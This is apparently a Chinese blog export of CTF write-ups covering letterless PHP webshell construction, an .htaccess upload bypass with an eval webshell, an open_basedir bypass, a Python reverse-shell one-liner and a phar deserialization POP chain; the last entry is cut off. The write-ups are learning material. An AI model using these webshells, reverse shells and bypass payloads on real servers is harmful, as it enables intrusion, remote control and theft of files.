    <url>%2F2021%2F08%2F24%2F%5Bb01lers2020%5DWelcome%20to%20Earth%201%2F</url>
    <content type="text"><![CDATA[考点burp抓包 F2源代码分析 解题过程打开一个页面，只显示了几个单词。 隔了几秒钟，跳转到 /ded/这个页面 bp启动。 经过分析，当event.keyCode == 27会跳转到 /chase/，那为什么不手动跳转？ 跳转 /leftt/ 点击 continue 打开 /open/ 得到 /fight/ 最后得到 我以为这里肯定很深奥，但是我想半天也没想明白，这个 scrable 函数到底起什么作用，我看了别人wp，只不过是障眼法，flag只需要把 check_action里的 flag 组合出来就行。 getflagpy一下，上脚本 123456789101112from itertools import permutationsimport reflag = ["&#123;hey", "_boy", "aaaa", "s_im", "ck!&#125;", "_baa", "aaaa", "pctf"]# 对flag字典里的内容进行排列组合item = permutations(flag)# 遍历for a in item: k = ''.join(list(a)) # 匹配 if re.search('^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$', k): print(k) 得到 第三个就是。 总结这道题没我想象中那么复杂，确实没有什么难度，唯一学到的知识点，就是知道了一个排列组合的库 from itertools import permutations，这道题排在第三页，越往后做起的人越少，也越来越难，有点摸不着头脑。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【SUCTF 2019】EasyWeb 1]]></title>
    <url>%2F2021%2F08%2F23%2F%5BSUCTF%202019%5DEasyWeb%201%2F</url>
    <content type="text"><![CDATA[考点无字符webshell构造 文件上传 （.htaccess 绕过后缀检测） open_basedir/disable_function绕过 前置知识构造无字母webshell的三种方式1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; 在ctf中，我们一般遇到上面这种正则，不能传入字母和数字，是不是就不能执行webshell了呢，并不是，p神在他的博客中记录了三种方法，分别是异或、取反、自增。 异或如果我们要构造 phpinfo POST GET system 这类关键字，我们可以通过 两个没有被过滤的字符进行异或得到。 演示 1234567891011121314151617构造 phpinfo p:%FF^%8Fo:%FF^%90n:%FF^%91i:%FF^%96h:%FF^%97f:%FF^%99$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); 成功执行phpinfo();在php5 可以用assert 函数 php7 不能php5 下$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);// assert$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); //_POST$___=$$__; //$_POST$_($___[_]); //assert($_POST[_])POST _=phpinfo(); 生成脚本 python 123456789101112import urllib.parsefind = ['p','h','i','n','f','o']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print("%s:%s^%s"%(result,a,b)) php 12345678910111213141516171819$l = "";$r = "";$argv = str_split("_GET");for ($i = 0; $i &lt; count($argv); $i++) &#123; for ($j = 0; $j &lt; 255; $j++) &#123; $k = chr($j) ^ chr(255); // dechex(255) = ff if ($k == $argv[$i]) &#123; if ($j &lt; 16) &#123; $l .= "%ff"; $r .= "%0" . dechex($j); continue; &#125; $l .= "%ff"; $r .= "%" . dechex($j); continue; &#125; &#125;&#125;echo "\&#123;$l`$r\&#125;"; 取反参考 与异或类似，不过它利用的是 UTF-8 编码中的某个汉子 , 将其中的某个字符提取出来 , 进行取反后得到对应字符 生成步骤 找到 “p“ 对应的 ASCII码，拿到对应的十六进制编码 70 在前面添加两个十六进制数 . 这个数是任意的 . 然后将它取反 . 在线 比如这里用 7B，然后就行取反。 将取反后的数字写成 NCR 格式( &amp;#x … ) , 并且将它转换为中文字符 在线 &amp;#x848f 带入代码测试 , 取第二个字符( 第一个字符是你任意添加的 ) , 即可得到需要的字符 示范 构建 phpinfo 进行测试 p h i n f o 对应的 十六进制编码 70 68 69 6e 66 6f 加入 7b 取反 原字符 十六进制 取反 转为字符 p 7b70 848F 蒏 h 7b68 8497 蒗 i 7b69 8496 蒖 n 7b6e 8491 蒑 f 7b66 8499 蒙 o 7b6f 8490 蒐 12345678910111213141516171819202122232425262728&lt;?php$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //2$__='';$___="蒏";$__.=~($___&#123;$_&#125;);$___="蒗";$__.=~($___&#123;$_&#125;);$___="蒏";$__.=~($___&#123;$_&#125;);$___="蒖";$__.=~($___&#123;$_&#125;);$___="蒑";$__.=~($___&#123;$_&#125;);$___="蒙";$__.=~($___&#123;$_&#125;);$___="蒐";$__.=~($___&#123;$_&#125;);// phpinfo();$__();p神的例子 $__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___&#123;$_&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="的";$____.=~($___&#123;$_&#125;);$___="半";$____.=~($___&#123;$_&#125;);$___="始";$____.=~($___&#123;$__&#125;);$_____='_';$___="俯";$_____.=~($___&#123;$__&#125;);$___="瞰";$_____.=~($___&#123;$__&#125;);$___="次";$_____.=~($___&#123;$_&#125;);$___="站";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);POST 2=phpinf(); 注意事项：这个写在php文件中能直接运行，通过GET传参就报错 eval()&#39;d code:1 Stack trace:，经过多次测试，需要进行url编码提交才不会报错。 递增运算得到对应字符这个就直接上代码，方式不一样，目的一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364p神案例 // ASSERT($_POST[_]); 这个仅支持 php5 php7 需要更换assert 为其他代码执行函数 &lt;?php $_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); POST _=phpinfo();// 自己构造的命令执行 (SYSTEM)($_POST[_]); 函数自调用 需要php7.0 以上&lt;?=$_=[]?&gt;&lt;?=$_="$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$______=$__++?&gt;&lt;?=$_______=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$__++?&gt;&lt;?=$________=$__++?&gt;&lt;?=$_________________=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__________=$__++?&gt;&lt;?=$_________=$________.$__________.$________.$_________________.$____.$_____?&gt;&lt;?=($_________)($&#123;'_'.$_______.$______.$________.$_________________&#125;[_])?&gt; // 可做免杀马 不能直接POST提交 会报 Parse error: syntax error, unexpected '&lt;', expecting end of file in// 编码也没用 绕过 open_basedir/disable_function open_basedir是php.ini中的一个配置选项它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名。举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。 payload 1chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;)); 也可以用蚁剑 disable_functions 插件绕过 解题过程打开得到一份代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! # 构建路径 $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir))&#123; # 创建路径 mkdir($userdir); &#125; # 判断文件是否上传 if(!empty($_FILES["file"]))&#123; # 拿到上传的临时文件名 $tmp_name = $_FILES["file"]["tmp_name"]; # 拿到文件名 $name = $_FILES["file"]["name"]; # 拿到后缀 $extension = substr($name, strrpos($name,".")+1); # 后缀不能存在 ph if(preg_match("/ph/i",$extension)) die("^_^"); # 文件内容不能存在 &lt;? if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die("^_^"); # 通过文件头判断是否为常见的图片文件类型 if(!exif_imagetype($tmp_name)) die("^_^"); $path= $userdir."/".$name; # 将文件保存到刚刚创建的路径下 @move_uploaded_file($tmp_name, $path); # 输出路径 print_r($path); &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123; highlight_file(__FILE__);&#125;# 传入字符长度不能大于18if(strlen($hhh)&gt;18)&#123; die('One inch long, one inch strong!');&#125;# 不能有字母数字以及一些其他字符# 无字母webshell 不能用取反来构造if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die("Almost there!");# 代码执行 调用get_the_flageval($hhh);?&gt; 代码审计通过审计，getshell可以分为两个步骤，第一步，先绕过条件 if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\反引号~_&amp;.,|=[\x7F]+/i&#39;, $hhh) ) ，这个条件通过 异或的方式构造无字母webshell绕过。第二步：需要绕过三个条件，分别是 if(preg_match(&quot;/ph/i&quot;,$extension))，后缀不能带有ph。if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False)，文件内容中不能存在 &lt;?。if(!exif_imagetype($tmp_name)) ，文件头必须是常见图片类型文件头。绕过方式：通过上传.htaccess文件，在.htaccess文件中，需要伪造图片头来过第三个条件的检测 ，通常我们会想到GIF89a来绕过，但是这样会让.htaccess文件不能生效，这时可以通过 在.htaccess 头部添加#define width 1337 #define height 1337 绕过。然后再上传头部带有GIF89a、后缀名为jpg的一句话。 第一步 通过异或构造无字母webshell 1234567891011// $&#123;_GET&#125;&#123;_&#125;(); // 通过上面给的脚本 分别用 _ G E T 来作为异或目标// 得到_:%FF^%A0T:%FF^%ABG:%FF^%B8E:%FF^%BA// 组装$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();// phpinfo 测试$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=phpinfo 没有问题，也可以直接执行get_the_flag。 第二步 上脚本 再进行.htaccess 文件内容构建的时候，需要知道文件上传的路径，路径的构建规则,upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])，得到 upload/tmp_532fb014387262fa08e25fd65663cac2。 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则 123456789101112131415161718192021222324import requestshtaccess = b"""#define width 1337#define height 1337AddType application/x-httpd-php .jpgphp_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg""""# 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则shell = "GIF89a"+"aa"+"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=="# &lt;?php eval($_POST['cmd']);?&gt;url = 'http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag'# print(url)# 上传 .htaccess files = &#123;'file':('.htaccess', htaccess, 'image/jpeg')&#125;data = &#123;'upload':'submit'&#125;res = requests.post(url=url, data=data, files=files)print(res.text)# 上传shellfiles = &#123;'file':('shell.jpg', shell, 'image/jpeg')&#125;data = &#123;'upload':'submit'&#125;res = requests.post(url=url, data=data, files=files)print(res.text) 执行 getshell蚁剑连接 但是不能跳转到其他目录，使用蚁剑的disable_functions插件，辅助工具-&gt;绕过disable_functions-&gt;选择模式-&gt;PHP7_GC_UAF 。 手动绕过open_basedir payload123url: http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpgPOSTcmd=chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;)); 总结用无字母webshell的方式绕过正则对字母数字的匹配，通过上传.htaccess的方式绕过对正则对后缀的匹配，.htaccess为什么上传这个文件就能让上传的图片当做php文件执行呢？ 实际上就是apache的一个配置文件，也就是只有服务器是apache的时候可以这样做，nginx就不行。 而 AddType 这个参数可以为当前目录下的 指定的后缀名添加MIME类型。 刚刚我们设置的 AddType application/x-httpd-php .jpg 就是把.jpg后缀的MIME类型设置为 application/x-httpd-php，服务器去读取.jpg文件的时候会把它当成php文件读取，所以，里面的一句话就能执行。 学到了不少。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件上传</tag>
        <tag>无字母数字webshell</tag>
        <tag>open_basedir/disable_function绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【网鼎杯 2020 白虎组】PicDown 1]]></title>
    <url>%2F2021%2F08%2F22%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown%201%2F</url>
    <content type="text"><![CDATA[考点文件包含（python） 代码审计（python） 命令执行（python） 前置知识python反弹shell1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 解题过程打开 就一个输入框，提交数据后会跳转到page页面，请求参数名为url，感觉像ssrf，其实不是，但还是可以通过传入 url链接去读取网页源代码，并且返回为 一个名为 beautiful.jpg的文件，用文本打开实际上是个网页。 尝试包含 /etc/passwd 也成功包含出来。 非预期解这里直接尝试包含了下 /flag ,发现直接包含了出来。 预期解接下来通过读取 /proc/self/cmdline 来查看当前进程的执行命令 读取 app.py，得到 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = "/tmp/secret.txt"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index(): return render_template('search.html')@app.route('/page')def page(): url = request.args.get("url") try: # url参数值中不能以字符 file 开头 if not url.lower().startswith("file"): # 打开url res = urllib.urlopen(url) # 读取 value = res.read() # 返回 response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = "HACK ERROR!" except: value = "SOMETHING WRONG!" return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager(): key = request.args.get("key") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get("shell") # 执行命令 os.system(shell) res = "ok" else: res = "Wrong Key!" return resif __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 代码审计通过审计，发现在manager函数中存在命令执行，有一个条件，没有过滤。 1if key == SECRET_KEY: 传入的 key 要等于 SECRET_KEY，那么这个SECRET_KEY 要怎么获取呢。 1234SECRET_FILE = "/tmp/secret.txt"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE) 通过上面代码可以知道，从/tmp/secret.txt 中读取到SECRET_KEY后就会把这个文件删除，这就会导致我们读取不到。 Linux当中，文件只要没有关闭，就会读取到内存当中，就算是remove也是一样，打开的文件存在/proc/[pid]/fd路径下，这个路径下有很多以数字保存的文件，例如 /proc/self/fd/1这样。 bp启动，爆破。 得到 getshell1234567key = request.args.get("key") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get("shell") # 执行命令 os.system(shell) res = "ok" 拿到看KEYCRET_KEY，就可以执行命令了，但是这里即便执行成功，也只会返回ok，这里我们用python反弹shell。 先在服务器当监听 构造payload 1no_one_know_the_manager?key=TdCTIhB6KGIVLP1AYx623LPgIFlKIZeXjQEIecV1ZtA=&amp;shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' url编码 1python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22IP%22,PORT));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'%0A 提交，在根目录下。 总结这道题没什么难度，考得都很是常识，但我就是偏偏不会，通过读取 /proc/self/cmdline 来查看当前进程的执行命令，通过读取/proc/self/fd/1 查看在内存中的文件，学到了学到了。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含(Python)</tag>
        <tag>代码审计(Python)</tag>
        <tag>命令执行(Python)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【SWPUCTF 2018】SimplePHP 1]]></title>
    <url>%2F2021%2F08%2F22%2F%5BSWPUCTF%202018%5DSimplePHP%201%2F</url>
    <content type="text"><![CDATA[考点代码审计 反序列化（phar反序列化 和 pop链构造） 前置知识phar反序列化的三个前提条件 可以上传phar文件 有可以利用的魔术方法 文件操作函数的参数可控 phar文件生成1234//生成phar文件前需要配置php.ini[Phar]; http://php.net/phar.readonlyphar.readonly = On 改成 Off 1234567891011// 创建对象 exp.phar 是文件名$phar = new Phar('exp.phar');$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');// $c1 就是要反序列化的对象$phar-&gt;setMetadata($c1);// 要压缩的文件$phar-&gt;addFromString('exp.txt','test');$phar-&gt;stopBuffering(); 可以代替unserialize 进行反序列化操作的函数 fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen fileinode filemtime fileowner fikeperms is_dir is_executable is_file is_link is_readable is_writable is_writeable parse_ini_file copy unlink stat readfile 魔法方法 __destruct 类对象被删除时自动调用，反正只要创建对象，都会自动调用一次 __toString 使用 echo 或者 print 进行输出时 就会自动调用 __get 读取不可访问（protected 或 private）或不存在的属性的值时会自动调用 pop链构造 1、找到可利用的地方，比如，文件包含，命令执行等地方 2、从可以利用地方回溯到可控制的地方，找到一个链条。 3、更改属性内容，先进行序列化，看看能不能达到目的。 4、能够达到目的，才进行反序列化，进行提交 有需要编码 就进行编码 解题过程打开两个基本的功能，文件上传和查看文件 当然，首先联想到的就是，上传图片马，文件包含getshell，事实上想太简单了，文件包含直接输出字符串，就像这样。 经过多次尝试，文件上传只能上传gif,jpg这几中文件，白名单，上传路径为/upload。文件包含只能包含，/var/www/html目录下的文件，可以包含出源代码。 获取源码放两个关键点的代码 file.php 12345678910111213141516171819202122&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);include &apos;function.php&apos;;include &apos;class.php&apos;;ini_set(&apos;open_basedir&apos;,&apos;F:\Code\PHP\Poc\Serializer\phar\web3&apos;);$file = $_GET[&quot;file&quot;] ? $_GET[&apos;file&apos;] : &quot;&quot;;if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;# 创建 一个show对象$show = new Show();// 反序列化触发点if(file_exists($file)) &#123; # 将$_GET[&apos;file&apos;]得到的值 赋值给 $show-&gt;source $show-&gt;source = $file; // $show-&gt;source = new Test(); # 调用$show-&gt;_show() 方法 功能：高亮显示一个文件 $show-&gt;_show();&#125; else if (!empty($file))&#123; die(&apos;file doesn\&apos;t exists.&apos;);&#125;?&gt; class.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; # 如果不是 new Show() 的时候传入$file 那么不会执行 __toString public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.phar echo $this-&gt;source; // 会触发 __toString 方法 &#125; public function __toString() &#123; # $this-&gt;&gt;str = new C1e4r(new Test())// echo "__toString"; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; # 反序列化会触发 public function __wakeup() &#123; if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker~"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; # __get()，获得一个类的成员变量时调用 # public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = "index.php"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; # 读取flag $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125; 代码审计通过审计可以得知，这道题是phar反序列化，触发点可以不用是unserialize，找到一个能够触发反序列的关键函数file_exists ，这里的$file变量可控。 file.php 中 123456789101112# 创建 一个show对象$show = new Show();// 反序列化触发点if(file_exists($file)) &#123; # 将$_GET['file']得到的值 赋值给 $show-&gt;source $show-&gt;source = $file; // $show-&gt;source = new Test(); # 调用$show-&gt;_show() 方法 功能：高亮显示一个文件 $show-&gt;_show();&#125; else if (!empty($file))&#123; die('file doesn\'t exists.');&#125; pop链构造从file.php 文件中找到了反序列化触发点，接下来就要找到一个可以利用的点。 在class.php 中 Test类中的一个方法。 123456public function file_get($value) &#123; # 读取flag $text = base64_encode(file_get_contents($value)); return $text; &#125; 简化class.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; # 如果不是 new Show() 的时候传入$file 那么不会执行 __toString public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.phar echo $this-&gt;source; // 会触发 __toString 方法 &#125; public function __toString() &#123; # $this-&gt;&gt;str = new C1e4r(new Test())// echo "__toString"; $content = $this-&gt;str['str']-&gt;source; return $content; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; # __get()，获得一个类的成员变量时调用 # public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = "index.php"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; # 读取flag $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125; 接下来从class.php 文件中的 几个类中构建出 pop链。 1C1e4r::__destruct-&gt;Show::__toString-&gt;Test::__get 构造pop链要从可以利用的地方放回构建。 首先Test类中要调用__get方法，那么类方法中必须调用一个不存在的属性或者私有属性，在Show类中的__toString方法中，有这么一句 $content = $this-&gt;str[&#39;str&#39;]-&gt;source; ，我们让$this-&gt;str[&#39;str&#39;] 为 Test类，那么 调用的就是 $content = Test-&gt;source;，就会触发Test类调用__get，__get中会调用get方法，get方法又会调用file_get，然后执行到file_get_contents。那要怎么才能让__toString执行呢，在C1e4r类中有一个__destruct方法，这个方法有一句 echo $this-&gt;test; ,echo则会触发__toString的执行，所以我们要让$this-&gt;test 为 $this-&gt;test = new Show() ，但是这里还不能这样做，在C1e4r中的__destruct方法中 $this-&gt;test 要被 $this-&gt;str赋值，所以，这里，直接给 $this-&gt;str = new Show()。 上代码 注意：这里要生成phar文件，需要在 php.ini 中 让phar.readonly = On 为 Off，不然会报错 12345678910111213141516171819202122$c1e4r = new C1e4r();$show = new Show();$test = new Test();// 这里之所以要为params['source'] 是因为你Show的__toStringd调用source;// Test的 get方法会进行检测 $this-&gt;params[$key] 未定义 则赋值 index.php// 因为调用了一个未定义属性 source ,所以$key的值为 'source' // 所以这里的 $value = $this-&gt;params[$key]; 获取的就是 '/var/www/html/f1ag.php'$test-&gt;params['source'] = '/var/www/html/f1ag.php';$show-&gt;str['str'] = $test;$c1e4r-&gt;str = $show;# 创建对象 exp.phar 是文件名$phar = new Phar('exp.phar');$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');//$phar-&gt;setMetadata($c1e4r);// 要压缩的文件$phar-&gt;addFromString('exp.txt','test');$phar-&gt;stopBuffering(); 执行生成 phar后缀肯定上传不上去，改后缀上传 找到文件 phar://伪协议读取 1file.php?file=phar://upload/8db450d8192e8744a04cbdef20abcaf1.jpg 得到 这个就是flag，不解码了。 总结通过这道题，再一次巩固了反序列化的phar类型的题，不仅是phar类型，还有pop链的构造，我对pop链构造一直都不是很熟悉，说到底都还是这种类型的题做得太少，自己觉得这个题还是有难度，尤其是这么多个文件，还是去找执行反序列化的地方，刚开始，我一直以为是Test类file_get方法中的 file_get_contents函数，但是怎么想都不对，如果是它，那怎么利用呢，基本上不可能，看了别的师傅wp，才知道用phar://协议读取，file_exists函数也可以触发反序列化，学到了很多 。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>代码审计</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【web】一道TimelineSec团队入队题]]></title>
    <url>%2F2021%2F08%2F22%2F%5Bweb%5D%E4%B8%80%E9%81%93TimelineSec%E5%9B%A2%E9%98%9F%E5%85%A5%E9%98%9F%E9%A2%98%2F</url>
    <content type="text"><![CDATA[考点源码泄露 代码审计 preg_match绕过 前置知识thinkphp助手函数助手函数 助手函数对常用的函数进行了封装，（可以理解别名，但不能完全这么理解）大概如下几种。 app url input redirect validate cookie env 这里主要讲 input。 input 有点类似与 $_GET $_POST 语法格式 1input(&apos;请求类型.]参数名[/变量修饰符]&apos;, &apos;默认值&apos;, &apos;过滤方法&apos;); 获取某个请求类型的所有请求参数 123456789// 获取get请求类型的所有参数及其参数值// 返回值：一维数组// 键名：参数名，键值：参数值$array = input(&apos;get.&apos;);// 获取post请求类型的所有参数及其参数值// 返回值：一维数组// 键名：参数名，键值：参数值$array = input(&apos;post.&apos;); 获取某个请求参数的值 12// 获取任何请求类型的name参数值$name = input(&apos;name&apos;); 变量修饰符 12// 获取指定参数的值并将转为数字$id = input(&apos;id/d&apos;); 参数默认值 123// 获取指定参数的值 没有获取到将返回默认值// 示例：如果id参数不存在，返回 666$id = input(&apos;id&apos;, 666); 过滤方法 12// 获取指定参数的值再经过intval函数进行过滤$id = input(&apos;id&apos;,&apos;&apos;, &apos;intval&apos;); 可用input 这个助手函数绕过正则对$_GET/$_POST等关键字过滤。 解题过程打开 报了403，紧接着扫扫目录。 发现源码泄露，down下来。 代码审计通过把代码放到Seay进行自动审计，得到结果。 